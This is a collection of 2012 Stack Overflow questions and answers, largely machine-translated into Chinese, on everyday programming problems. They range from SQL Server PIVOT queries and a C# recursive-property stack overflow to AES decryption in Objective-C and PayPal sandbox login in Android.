MultiInstanceLoopCharacteristics loop = new MultiInstanceLoopCharacteristics();
UserTask task = new UserTask();
task.setLoopCharacteristics(loop); 
```

那么您应该以编程方式部署您的流程（因为您使用的是 bpmn 模型对象而不是实际的运行时（引擎对象））

# android - Logic for backing up contacts

> ID：11847580
> 
> 赞同：-2
> 
> 时间：2012-08-07T13:55:48.980
> 
> 标签：android, backup, contacts

I am creating an app to backup contacts to a webserver. I am still new to android development so I can't think of the logic to do this. I know that the contact id is not constant and it can change. So how can I keep track of changed data to existing and new contacts?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-07T14:00:41.560

You need to first grab the contacts in Android look at the example code in the AOSP project for the people app, that will show you the way that Google is doing it officially, which doesn't necessarily make it the best method, but it's a lot easier to re-tool their code than write it all from scratch.

Here's how to get started with the Android build environment: [http://source.android.com/source/initializing.html](http://source.android.com/source/initializing.html)

Here's another question, similar to yours that might help with the contact data: [How to read contacts on Android 2.0](https://stackoverflow.com/questions/1721279/how-to-read-contacts-on-android-2-0)

On your end, you need to setup a SQL server of some kind... and one of the fields just needs to be "Last Updated", either add a date to that field, or a revision number that you're tracking elsewhere and decide to update based on the query out of that field.

# python - 在 Plone 中对字符串进行区域设置感知排序

> ID：11847583
> 
> 赞同：2
> 
> 时间：2012-08-07T13:55:56.327
> 
> 标签：python, sorting, plone, locale

* * *

使用存储克隆目录查询的标准方法

```
result = catalog(..., sort_on='sortable_title') 
```

在现实中不是很有用，因为排序规则因国家和语言而异。

这是一些内置功能，用于对给定语言环境的字符串（或对象）列表进行排序？

临时切换 Python 语言环境的标准技巧不适合，因为它不是线程安全的。

有什么选择吗？

# sql - 在 SQL Server 2005 中将行转入列

> ID：11847584
> 
> 赞同：0
> 
> 时间：2012-08-07T13:56:04.347
> 
> 标签：sql, sql-server, tsql, sql-server-2005, pivot

我有一个 sql 查询“Select * from tablename”，其输出是

```
col1   col2       
  A     1 
  B     2 
  C     3 
```

我想将上面的输出修改如下

```
A      B      C
1      2      3 
```

请让我知道我怎么能做到这一点

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-07T14:05:16.063

您将需要执行[`PIVOT`](http://msdn.microsoft.com/en-us/library/ms177410%28v=sql.105%29.aspx). 使用 PIVOT 有两种方法可以做到这一点，一种是您对要转换的列进行编码的静态 Pivot，另一种是在执行时确定列的动态 Pivot。

静态枢轴：

```
SELECT *
FROM
(
    SELECT col1, col2
    FROM yourTable
) x
PIVOT
(
   min(col2)
   for col1 in ([A], [B], [C])
)p 
```

请参阅[带有演示的 SQL Fiddle](http://sqlfiddle.com/#!3/39ec3/1)

动态枢轴：

```
DECLARE @cols AS NVARCHAR(MAX),
    @query  AS NVARCHAR(MAX)

select @cols = STUFF((SELECT distinct ',' + QUOTENAME(col1) 
                    from t1
            FOR XML PATH(''), TYPE
            ).value('.', 'NVARCHAR(MAX)') 
        ,1,1,'')

set @query = 'SELECT ' + @cols + ' from 
             (
                select col1, col2
                from t1
            ) x
            pivot 
            (
                min(col2)
                for col1 in (' + @cols + ')
            ) p '

execute(@query) 
```

请参阅[带有演示的 SQL Fiddle](http://sqlfiddle.com/#!3/39ec3/2)

如果您不想使用该`PIVOT`函数，则可以使用`CASE`语句执行类似类型的查询：

```
select 
  SUM(CASE WHEN col1 = 'A' THEN col2 END) as A,
  SUM(CASE WHEN col1 = 'B' THEN col2 END) as B,
  SUM(CASE WHEN col1 = 'C' THEN col2 END) as C
FROM t1 
```

请参阅[带有演示的 SQL Fiddle](http://sqlfiddle.com/#!3/39ec3/12)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-07T14:13:37.677

您想在 sql 中使用`PIVOT`or `COALESCE`。这是一个很好的示例，如何将行转换为列。 [将行转换为列的五种方法](http://sqlserveradvisor.blogspot.com/2009/03/sql-server-convert-rows-to-columns.html)

.

# c# - C# 堆栈溢出状态

> ID：11847585
> 
> 赞同：1
> 
> 时间：2012-08-07T13:56:06.260
> 
> 标签：c#

在我的基类中，其他人继承的基类具有以下属性：

```
private int DEFAULT_DISPLAY_ORDER = 999999;
private DateTime DEFAULT_DT = new DateTime(1111,1,1);

public int? Id {
    get 
    { 
        return Id.GetValueOrDefault(0);  
    }
    set 
    {
        if (DisplayOrder == null) DisplayOrder = DEFAULT_DISPLAY_ORDER;
        Id = value;
    }
}
public String Description { get; set; }
public int? DisplayOrder { get; set; } 
```

但是当我执行它时，我得到了这个错误：

```
+ $exception {
     Cannot evaluate expression because the current thread is in a stack 
     overflow state.}
     System.Exception {System.StackOverflowException} 
```

在线的

```
if (DisplayOrder == null) DisplayOrder = DEFAULT_DISPLAY_ORDER; 
```

这到底是怎么回事？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-08-07T13:59:00.517

看这个：

```
public int? Id {
    get 
    { 
        return Id.GetValueOrDefault(0);  
    } 
```

在这里，访问`Id`需要您首先获取`Id`...。砰。

下一个：

```
set 
{
    if (DisplayOrder == null) DisplayOrder = DEFAULT_DISPLAY_ORDER;
    Id = value;
} 
```

看第二部分。为了设置`Id`，你必须...调用设置器`Id`。砰。

您需要一个字段：

```
private int? id;

// Now use the field in the property bodies
public int? Id {
    get 
    { 
        return id.GetValueOrDefault(0);  
    }
    set 
    {
        if (DisplayOrder == null) DisplayOrder = DEFAULT_DISPLAY_ORDER;
        id = value;
    }
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-07T13:58:29.887

你从内部调用 Id - 无限递归......不好:)

```
public int? Id {
    get 
    { 
        return Id.GetValueOrDefault(0); // This will keep calling the getter of Id. You need a backing field instead.
    }
    set 
    {
        if (DisplayOrder == null) DisplayOrder = DEFAULT_DISPLAY_ORDER;
        Id = value; // And here...
    }
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-07T13:58:33.843

`ID = value`将引发一个循环。您应该有一个私有变量`_id`，并在属性的 setter 和 getter 部分中使用它。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-07T14:00:21.430

You're creating a infinite loop, because you are referring to Id property in get and set of the Id property :P. So in get, you are getting to get the getting ;). And in the set, you are setting to set the setting. Weird huh? :)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-07T13:59:16.557

```
Id = value; 
```

这样做。您正在对同一属性内的属性进行递归赋值。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-08-07T13:59:44.417

当您调用 Id 时，它会一遍又一遍地再次递归调用 Id。

```
return Id.GetValueOrDefault(0); 
```

# android - 具有多个过滤器的 SQLite 查询

> ID：11847587
> 
> 赞同：0
> 
> 时间：2012-08-07T13:56:09.600
> 
> 标签：android, sqlite, args

我有一个光标填满了我在 Android 中的 ListView。

我的光标代码：

```
Cursor cursor = sqliteDatabase.query("ProductosTratamientos", null,
            "codigoproducto <> '70027, 70029, 70024'", null, null, null, null); 
```

它不工作。它继续使用以下值填充列表：70027、70029、70024。

我究竟做错了什么？

谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-07T14:00:16.020

而不是使用`<>`，您需要`NOT IN`在一组值中使用 which 提供查找。因此，请尝试将您的查询更改为：

```
Cursor cursor = sqliteDatabase.query("ProductosTratamientos", null,
       "codigoproducto NOT IN (70027, 70029, 70024)", null, null, null, null); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-07T14:00:45.123

试试这个代码：

```
Cursor cursor = sqliteDatabase.query("ProductosTratamientos", null,
            "codigoproducto <> ? AND codigoproducto <> ? AND codigoproducto <> ?',
            new String[]{"70027", "70029", "70024"},
            null, null, null); 
```

# android - 如何在 Android 主屏幕小部件中显示加载进度对话框旋转轮

> ID：11847588
> 
> 赞同：3
> 
> 时间：2012-08-07T13:56:09.557
> 
> 标签：android, widget, loading, progressdialog

我已经看到一些 Android 小部件在从 Web 获取信息时显示旋转轮加载动画（与不确定的 ProgressDialog 相同的动画）。您如何为主屏幕小部件执行此操作？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-07T14:05:52.327

我自己没有尝试过，但可能[AnimationDrawable](http://developer.android.com/reference/android/graphics/drawable/AnimationDrawable.html)可以工作。

# pthreads - 说一个进程中的所有线程共享相同的数据是什么意思？

> ID：11847593
> 
> 赞同：3
> 
> 时间：2012-08-07T13:56:15.523
> 
> 标签：pthreads

在我的教科书中它说：

> 进程中的所有线程都可以访问相同的数据（共享）

但是每个线程都有自己的堆栈，这意味着局部变量不共享。那么什么样的数据线程可以共享。

更新：

我发现每个线程都可以共享全局变量，这让我很困惑，我学到的全局全局变量是静态堆栈，每个线程都有自己的堆栈不应该共享。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-07T13:58:28.617

> 我发现每个线程都可以共享全局变量，这让我很困惑，我学到的全局全局变量是静态堆栈，每个线程都有自己的堆栈不应该共享。

您对堆栈考虑太多了，还有其他内存区域，例如`data`or `bss`。具有静态存储的对象（例如全局变量和使用修饰符声明的对象`static`）在所有线程之间共享。

此外，如果您努力，所有线程都可以访问*所有内容*，不同的“堆栈”没有什么特别之处。如果一个线程设法获得一个指向另一个“堆栈”上的位置的指针，它可以自由地读取它，修改它等等。

所有这一切的要点是线程不只是共享变量。它们只是**在同一个虚拟内存空间**中。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-07T14:20:30.963

首先，全局变量和静态变量是共享的。

其次，您可以通过全局变量中的指针（或...）访问的 malloc 内存是共享的。

第三，可以通过全局变量中的指针（或...）访问的线程堆栈中的内存是共享的。

确实，所有这些都是共享的，所有时间，但并非所有都可以访问。线程 A 可以访问线程 B 的堆栈，但除非线程 B 执行诸如将其堆栈中某物的地址分配给全局（不要这样做）或您正在做某事之类的事情，否则它不会有一个指针来执行此操作您在其中检查线程的详细信息并进入它们的堆栈（如果您这样做，那么您对 ​​pthreads 实现的机制比我更了解*，所以我不会告诉您不要这样做，但作为一项规则，这不会是轻率的事情）。

大多数情况下，您只需要担心全局和静态，并且可以认为仅在本地处理的任何事情都是线程安全的，但是一旦您可以从前者到达后者，这就会被吹走。

*实际上，我对此知之甚少，主要是基于其他语言的线程知识。真的，这是一个通用的线程，而不是一个特定的 pthreads，除了一些其他语言甚至不会让你陷入从全局引用堆栈内存的陷阱。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-07T14:10:23.050

@cnicutar 关于静态存储是正确的。[实际上，在另一个问题中](https://stackoverflow.com/questions/1762418/process-vs-thread)对此进行了很好的讨论。尽管那个问题的标题，那里的答案（尤其是前两个）确实很好地回答了你的问题，我认为我不能做得更好。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-07T14:07:10.253

如前所述，每个线程都有自己的堆栈。所以说这个栈上的数据是线程安全的，因为只有它拥有它。

```
All threads within a process have access to the same data (share) 
```

正如它所暗示的，多个线程可以访问相同的数据。这应该会敲响一些小警钟，因为您必须开始考虑线程同步（关键部分、互斥锁等）到共享资源。

通过 new 运算符在堆上分配的资源是共享的，因为所有线程都可以访问同一个堆。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-07T14:24:25.597

我认为不会为每个线程分配静态数据。它只会被实例化一次，并且所有在其 execute() 方法中声明了该静态数据的线程都可以访问它。

# javascript - 传递给 JavaScript 的 AppleScript 变量

> ID：11847594
> 
> 赞同：0
> 
> 时间：2012-08-07T13:56:25.563
> 
> 标签：javascript, applescript, textedit

我将 TextEdit 中的文本存储在 AppleScript 变量中，并且我想将其传递给 JavaScript。我以为我做得对，但我仍然无法获得要存储的价值。代码如下：

```
tell application "TextEdit"
    activate
    set docText to the text of the front document --This works. I've checked.
end tell

tell application "Google Chrome"
    tell window 1
        tell active tab
            execute javascript "function encryptDocument() {
                plainText = '" & docText & "';
                return plainText;
                } encryptDocument();"
                set skurp to the result
                display dialog skurp
            end tell
    end tell
end tell 
```

我将 JavaScript 代码包含在`tell application "Google Chrome"`命令中的原因是，每次尝试在上一个`tell application "TextEdit"`命令中调用它时都会出错。错误总是说它期望行尾但发现`"`。不太清楚为什么，但我找不到解决这个问题的方法。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-07T14:10:10.180

您要赋予变量的值（我的意思是文本编辑器中的文本）是否可能包含单引号（'）？在文本编辑器中没有 ' 这似乎对我有用。

以下代码片段可用于转义单引号。（改编自此[代码](http://www.macosxautomation.com/applescript/sbrt/sbrt-06.html)）

```
on escape(this_text)
    set AppleScript's text item delimiters to the "'"
    set the item_list to every text item of this_text
    set AppleScript's text item delimiters to the "\\'"
    set this_text to the item_list as string
    set AppleScript's text item delimiters to ""
    return this_text
end escape

tell application "TextEdit"
    activate
    set docText to the text of the front document --This works. I've checked.
end tell

set docText to escape(docText)

tell application "Google Chrome"
    tell window 1
        tell active tab
            execute javascript "function encryptDocument() {
                plainText = '" & docText & "';
                return plainText;
                } encryptDocument();"
            set skurp to the result
            display dialog skurp
        end tell
    end tell
end tell 
```

# java - 使用 mockito 模拟私有构造函数

> ID：11847595
> 
> 赞同：2
> 
> 时间：2012-08-07T13:56:29.173
> 
> 标签：java, junit, mockito

我有一个带有私有构造函数的单例类，并想为此编写单元测试。

知道如何使用 mockito 框架模拟具有私有构造函数的类。

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-07T14:01:20.700

虽然没有直接回答您的问题，但我认为值得阅读有关[单例反模式的](http://caines.ca/blog/programming/singletons-anti-pattern-or-worst-anti-pattern-ever/)信息，并且可能考虑使用一种替代方法，例如[依赖注入](http://en.wikipedia.org/wiki/Dependency_injection)来组合您的应用程序。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-07T14:02:43.593

那么你应该能够使用这个库：[http](http://code.google.com/p/powermock/) ://code.google.com/p/powermock/来做到这一点。但这是非常不鼓励的。

# c# - 从单元格 3 访问 Telerik RadGrid 中的单元格 1（非数据绑定）

> ID：11847597
> 
> 赞同：1
> 
> 时间：2012-08-07T13:56:34.497
> 
> 标签：c#, vb.net, telerik, eval, radgrid

我的网格是 5 列，一个“事件”列，后跟 Q1 到 Q4。四分之一列中的一个在任何给定时间都是可编辑的，其他三个是标签。这是我用来确定显示哪个的代码（q 在别处定义）：

```
<telerik:GridTemplateColumn HeaderText="Q2" DataField="Q2" UniqueName="Q2">
    <ItemTemplate>
        <% If (q = 3) Then%>
            <telerik:RadNumericTextBox ID="rntb_Q2" runat="server" Type="Number" ShowSpinButtons="true" Value='<%# CInt(Eval("Q2")) %>' Width="50px" CssClass="short" MinValue="0">
                <IncrementSettings InterceptArrowKeys="false" InterceptMouseWheel="false" Step="1" />
                <NumberFormat DecimalDigits="0" GroupSeparator="," />
            </telerik:RadNumericTextBox>
        <% Else%>
            <asp:Label ID="lbl_Q2" runat="server" Text='<%# If(Eval("Q2") Is Nothing, "0", Eval("Q2")) %>'></asp:Label>
        <% End If %>
    </ItemTemplate>
</telerik:GridTemplateColumn> 
```

这段代码一切正常；问题是当我想更改*一行*以始终显示标签时。我也尝试过`If ((q = 3) AndAlso (Not GetDataItem("EventDesc").ToString.ToLower = "total error doses"))`，`If ((q = 3) AndAlso (Not Eval("EventDesc").ToString.ToLower = "total error doses"))`但是两者都收到了一个错误，即无法在数据绑定之外使用 Eval 等。

感谢您的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T13:31:42.230

所以我试图做的是改变是否显示 RadNumericTextBox 或标签。这无需直接访问另一个单元格的内容即可实现结果。它使用 .ItemIndex 属性来确定哪些控件应该是可见的。

```
<telerik:GridTemplateColumn HeaderText="Q2" DataField="Q2" UniqueName="Q2">
    <ItemTemplate>
        <% If (q = 3) Then %>
            <telerik:RadNumericTextBox ID="rntb_Q2c" runat="server" Type="Number" ShowSpinButtons="true" Value='<%# Eval("Q2") %>' Width="75px" CssClass="short" Visible='<%#If(TryCast(Container, GridDataItem).ItemIndex < 9, True, False) %>'>
                <IncrementSettings InterceptArrowKeys="false" InterceptMouseWheel="false" Step="1" />
                <NumberFormat DecimalDigits="0" GroupSeparator="" />
            </telerik:RadNumericTextBox>
            <asp:Label ID="lbl_Q22" runat="server" Text='<%# Eval("Q2") %>' Visible='<%#If(TryCast(Container, GridDataItem).ItemIndex < 9, False, True) %>'></asp:Label>
        <% Else %>
            <asp:Label ID="lbl_Q2" runat="server" Text='<%# If(Eval("Q2") Is Nothing, "0", Eval("Q2")) %>'></asp:Label>
        <% End If %>
    </ItemTemplate>
</telerik:GridTemplateColumn> 
```

# ruby-on-rails - 带有红宝石的 Html5 视频

> ID：11847604
> 
> 赞同：1
> 
> 时间：2012-08-07T13:57:08.210
> 
> 标签：ruby-on-rails, ruby-on-rails-3, html, ruby-on-rails-3.1

我只是好奇如何使用 rails 将视频显示到一个简单的网页中。我尝试了以下

```
<%= video_tag("video/trailer_test.mp4", :code:size => "320x240", :controls => true, :autobuffer => true) 
```

但它似乎没有奏效。我的文件位于 public/video/trailer_test.mp4 下，但它不起作用有什么理由不应该起作用吗？请注意，我目前只有一个 mp4 文件。

这是创建的html

```
<video controls="controls" height="240" width="320"><source src="video/trailer_test.mp4" /></video> 
```

这是我的路径文件

```
/home/jean/rail/map/public/video 
```

这是我的文件名

```
trailer_test.mp4 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T14:29:46.807

几个月前我也遇到过类似的问题。尝试在括号 - 之间给出视频的路径`[]`：

```
<%= video_tag(["video/trailer_test.mp4"], :size => "320x240", :controls => true) %> 
```

# objective-c - 无法解密 AES 密文

> ID：11847605
> 
> 赞同：1
> 
> 时间：2012-08-07T13:57:08.863
> 
> 标签：objective-c, ios, cocoa, aes, encryption

**Edit2** 这个问题已经解决了。答案是关于[我的另一个问题](https://stackoverflow.com/questions/11857097/create-nsdata-by-interpreting-nsstring-as-hex-digits)。感谢 Hot Licks。

-------- 单独编辑----------------------------- --------

**Edit1：** 我确定我的密文和密钥是正确的。因为我的同事用C++解密它没有问题。顺便说一下，它是ECB模式。

我为这个问题努力了一个星期，但我仍然无法解决它。我现在真的不知道该怎么办。

我正在开发一个可可应用程序，我的服务器返回一个通过 AES 加密的密文给我。我必须解密这个密文以获得一些信息才能进行下一步。

我的密文是：

```
NSString *aesString = @"8DFE2F9A9384573FA0FFAE17C3BEF4CC2BA056CC5CBBFAB57AC78C83AF4EF8A48EA1728D904E87613845377821E01E07CC6C9DEA35516DC595421E0FFC7CAA7A19671E713BB74D84D1DD4FB2C972DD8FACF5D74AD32662E992EA13D2417ABCAEE4137098322394BA76BADBAF4C1DB344704BBF9ED8A1513FF4B2E766526C98A2808B7AE67D1866CB9B489764E70662B1499D8D467A8817D1304AAB8F92EBDDD3E871CC1374CAE96A1428F0C2AFCB3F43E705CDD7649BDE5A363D59125980D0ACBBE32879B96AB15E93F74C08D435B787A8EE734E2773E16AE8F4CB4A5DDAD989F92CF1C609F0F8B81FEDB67F974AE583548B13C86B6FE1925A33A47CBDA8ED54C20F2D8020650BA7FABBF8CBAC00493B6DE423880EF1A1AF8CDDC457C064CD6150AA30D34456E422EA707C313C7FBB428CE1C4E534EA8EDD8C21B62D526522606E6944C4058E631DAFC6F9A539F9A4DFD8AFECCEF51A8A4904A3EFA0A76F3CA55AB56C726B0787D9EBB261CA91F5ABBF985096B327A6269399AC11A23CAFB0B3A6B3FB4AA357FC1644C89B7DEE396C51AF734738E598B765B2384EB8931F4B65D9F4B6C73EE3F1F6C5AA17871D14335153E4058AB9BC0FCAD35DBDB924D00B0A71B985E20CDF530FA5479E2DD8F14D269CE59DA365BAC03FCCB037963E7E3F175A09DD7EFC66E450DF5A16E7233EA55009E4891EF238D003D5837F077C12167428AD19D3DA45D569AA252D5FFD736E134AD3B5654FD82506822BE9B78731C9CA5EE56685153E657E8B385013FF14BBE5A1F5938801E94FE498495C2D94C84A937E1C36A4667A16DFECED471C3902B4B3D1DAA9F2C72A09AF736EF51EBE39F0006667D60DDC9EC20C5C29CC8933E5FB9E293560DB6B152DF4864BD9CF02B0D40D5B24D0326F1D7E251A0CBC692B68FA37212A57F34588D18D6F4F7E59D997A8C4B5E452FE883645B90BD7EE3A4B38754616CA7A9D430620036DBEAD2EC03BEBB5C69E92F9A33951C22E83E68DD85350C7"; 
```

我的关键是：

```
NSString *key = @"810B16E3541EF7A4"; 
```

我使用[nicerobot'answer](https://stackoverflow.com/questions/2579453/nsdata-aes-class-encryption-decryption-in-cocoa)来解密我的密文并尝试许多其他方法。我希望有人能告诉我下一步该怎么做。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T00:51:25.053

AES accepts an initialization vector. What are you using for that?

If the data is in Hex or Base64, I don't see enough bits in your key for AES-128 (the shortest kind). If the key is the Ascii text of the hex string, that would be 128 bits but that seems a bit hokey. Such things happen but it would not be my first choice.

AES encrypts in multiple, not completely compatible modes, CBC and ECB are two I have worked with.

Anyway, I monkeyed around with this for fifteen minutes and I can’t get anything out of that but trash. I have to agree with HotLicks who suggested that you start with an encrypt/decrypt that runs within the same program.

Good luck, /Bob Bryan

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-07T14:31:31.440

使用以下代码将加密的字符串文本转换为 NSData 对象。

```
NSData* stringData = [encryptedStringText dataUsingEncoding:NSUTF8StringEncoding]; 
```

为 NSData 创建如下所示的类别，然后使用它对 NSData 内容进行 AES 解密。

```
NSData* unencryptedData = [stringData AES256DecryptWithKey:keyText]; 
```

将您的 NSData 对象转换为 NSString。

```
NSString* unencryptedStringText = [NSString stringWithUTF8String:[unencryptedData bytes]]; 
```

* * *

```
#pragma mark -
#pragma mark NSData Encryption Category

// ---------------------------------------------------------
// NSData Category to add Encryption
// ---------------------------------------------------------

@interface NSData (NSDataAESEncryption)
- (NSData *)AES256EncryptWithKey:(NSString *)key;
- (NSData *)AES256DecryptWithKey:(NSString *)key;
@end

@implementation NSData (NSDataAESEncryption)

- (NSData *)AES256EncryptWithKey:(NSString *)key {

    char keyPtr[kCCKeySizeAES256+1]; 

    bzero(keyPtr, sizeof(keyPtr)); 

    [key getCString:keyPtr maxLength:sizeof(keyPtr) encoding:NSUTF8StringEncoding];

    NSInteger dataLength = [self length];

    size_t bufferSize = dataLength + kCCBlockSizeAES128;
    void *buffer = malloc(bufferSize);

    size_t numBytesEncrypted = 0;
    CCCryptorStatus cryptStatus = CCCrypt(kCCEncrypt, kCCAlgorithmAES128, kCCOptionPKCS7Padding,
                                          keyPtr, kCCKeySizeAES256,
                                          NULL ,
                                          [self bytes], dataLength, 
                                          buffer, bufferSize, 
                                          &numBytesEncrypted);
    if (cryptStatus == kCCSuccess) {
        return [NSData dataWithBytesNoCopy:buffer length:numBytesEncrypted];
    }

    free(buffer); 

    return nil;
}

- (NSData *)AES256DecryptWithKey:(NSString *)key {

    char keyPtr[kCCKeySizeAES256+1]; 

    bzero(keyPtr, sizeof(keyPtr)); 

    [key getCString:keyPtr maxLength:sizeof(keyPtr) encoding:NSUTF8StringEncoding];

    NSInteger dataLength = [self length];

    size_t bufferSize = dataLength + kCCBlockSizeAES128;
    void *buffer = malloc(bufferSize);

    size_t numBytesDecrypted = 0;
    CCCryptorStatus cryptStatus = CCCrypt(kCCDecrypt, kCCAlgorithmAES128, kCCOptionPKCS7Padding,
                                          keyPtr, kCCKeySizeAES256,
                                          NULL ,
                                          [self bytes], dataLength, 
                                          buffer, bufferSize, 
                                          &numBytesDecrypted);

    if (cryptStatus == kCCSuccess) {
        return [NSData dataWithBytesNoCopy:buffer length:numBytesDecrypted];
    }

    free(buffer);

    return nil;
}

@end 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2016-01-12T09:55:07.933

尝试这个

```
+ (NSData *)doCipher:(NSData *)dataIn
              iv:(NSData *)iv
             key:(NSData *)symmetricKey
         context:(CCOperation)encryptOrDecrypt // kCCEncrypt or kCCDecrypt
           error:(NSError **)error
{
    CCCryptorStatus ccStatus   = kCCSuccess;
    size_t          cryptBytes = 0;
    NSMutableData  *dataOut    = [NSMutableData dataWithLength:dataIn.length + kCCBlockSizeAES128];

    ccStatus = CCCrypt( encryptOrDecrypt,
                   kCCAlgorithmAES128,
                   0, //kCCOptionPKCS7Padding,
                   symmetricKey.bytes,
                   kCCKeySizeAES128,
                   iv.bytes,
                   dataIn.bytes,
                   dataIn.length,
                   dataOut.mutableBytes,
                   dataOut.length,
                   &cryptBytes);

    if (ccStatus == kCCSuccess) {
        dataOut.length = cryptBytes;
    }
    else {
        if (error) {
            *error = [NSError errorWithDomain:@"kEncryptionError"
                                     code:ccStatus
                                 userInfo:nil];
        }
        dataOut = nil;
    }

return dataOut;
} 
```

# jquery - jQuery 1.8 位置无法正常工作

> ID：11847610
> 
> 赞同：1
> 
> 时间：2012-08-07T13:57:25.290
> 
> 标签：jquery, css, html

我正在使用 jQuery 1.8 位置功能将 div 的左上角定位到另一个 div 的左下角，如下所示：

```
$("#aDiv").position({
    my: "left top",
    at: "left bottom",
    of: "#someDiv"
}); 
```

输入数据时，所在位置的div会向下扩展，封装所有数据。但是，如果窗口的高度太小，无法容纳整个被定位的 div，那么 div 中的信息会向上扩展。我希望信息向下扩展而不是向上扩展。如何阻止 div 向上扩展？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-07T14:05:47.313

如果您使用 jQuery 1.8 和 jQuery UI。您需要使用 jQuery UI 1.8.22 或更高版本 [http://blog.jqueryui.com/2012/07/jquery-ui-1-8-22/](http://blog.jqueryui.com/2012/07/jquery-ui-1-8-22/)

# android - 贝宝集成登录失败错误？

> ID：11847618
> 
> 赞同：1
> 
> 时间：2012-08-07T13:57:42.537
> 
> 标签：android, login, paypal

![在此处输入图像描述](../Images/bb708857171d4387ab274c7daaefec66.png)

这是我的主要活动课程：

```
 package your.in.paypal;

 import java.math.BigDecimal;
 import android.app.Activity;
 import android.content.Intent;
 import android.os.Bundle;
 import android.util.Log;
 import android.view.View;
 import android.view.View.OnClickListener;
 import android.view.ViewGroup;
 import android.view.ViewGroup.LayoutParams;
 import android.widget.LinearLayout;

 import com.paypal.android.MEP.CheckoutButton;
 import com.paypal.android.MEP.PayPal;
 import com.paypal.android.MEP.PayPalActivity;
 import com.paypal.android.MEP.PayPalPayment;

 public class SimplePayPalIntegration extends Activity implements OnClickListener {
 private ViewGroup content;

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);

    invokeSimplePayment();
}

private void invokeSimplePayment(){

    try{

        PayPal pp = PayPal.getInstance();

        if(pp==null)

        pp = PayPal.initWithAppID(this, "APP-80W284485P519543T", PayPal.ENV_SANDBOX);

        LinearLayout layoutSimplePayment = new LinearLayout(this);

        layoutSimplePayment.setLayoutParams(new LayoutParams(LayoutParams.WRAP_CONTENT,LayoutParams.WRAP_CONTENT));

        layoutSimplePayment.setOrientation(LinearLayout.VERTICAL);

        CheckoutButton launchSimplePayment = pp.getCheckoutButton(this, PayPal.BUTTON_194x37, CheckoutButton.TEXT_PAY);

        launchSimplePayment.setOnClickListener(this);

        layoutSimplePayment.addView(launchSimplePayment);

        setContentView(layoutSimplePayment);

    }catch(Exception e)
    {
        e.printStackTrace();
    }
}

    @Override
protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         switch(resultCode) {

          case Activity.RESULT_OK:

              Log.d("", "RESULT_OK");
              break;

           case Activity.RESULT_CANCELED:
               Log.d("", "RESULT_CANCELED");
               break;

           case PayPalActivity.RESULT_FAILURE:
               Log.d("", "RESULT_FAILURE");
               break;
      }
}

    @Override
    public void onClick(View v) {

        PayPalPayment payment = new PayPalPayment();

        payment.setSubtotal(new BigDecimal("8.25"));

        payment.setCurrencyType("USD");

        payment.setRecipient("mymail@gmail.com");

        payment.setPaymentType(PayPal.PAYMENT_TYPE_GOODS);

        Intent checkoutIntent = PayPal.getInstance().checkout(payment, this);

        startActivityForResult(checkoutIntent, 1);

        Log.d("", "clicked");

    }
} 
```

这是我的`AndroidManifest.xml`：

```
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
 package="your.in.paypal"
 android:versionCode="1"
 android:versionName="1.0" >

<uses-sdk android:minSdkVersion="8" />

<uses-permission android:name="android.permission.INTERNET"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>

<application
    android:icon="@drawable/ic_launcher"
    android:label="@string/app_name" >
    <activity
        android:name=".SimplePayPalIntegration"

     android:configChanges="keyboardHidden|orientation">
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />

            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
    </activity>
      <activity android:name="com.paypal.android.MEP.PayPalActivity" 
                android:theme="@android:style/Theme.Translucent.NoTitleBar"
                android:configChanges="keyboardHidden|orientation"/>
</application> 
```

我已经将 The 添加`PayPal_MPL.jar`到项目中。当我运行项目时，我成功地转到了 paypal 按钮，当我单击该按钮时，我得到了登录页面，但是当我输入沙箱登录 ID 和密码时，我得到了错误`Login failed. Please try again.`，为什么？请告诉我我做错了什么。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-16T06:48:26.913

问题是您正试图在沙盒模式下进行真正的支付。PayPal 仅允许您在他们的实时服务器上进行实际付款（在他们有机会审查和批准您的应用程序之后）。当您准备好尝试付款时，在 X.com 上注册并提交您的应用程序。或者，您可以通过贝宝网站设置沙盒帐户。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-03-03T22:13:55.363

您需要访问[https://www.sandbox.paypal.com](https://www.sandbox.paypal.com)并创建一个帐户，以便您可以在沙盒模式下使用它。我收到了完全相同的消息，“登录失败。请重试。” 注册我的沙盒账户后，我可以成功测试，你不必担心从你的真实账户中花钱。

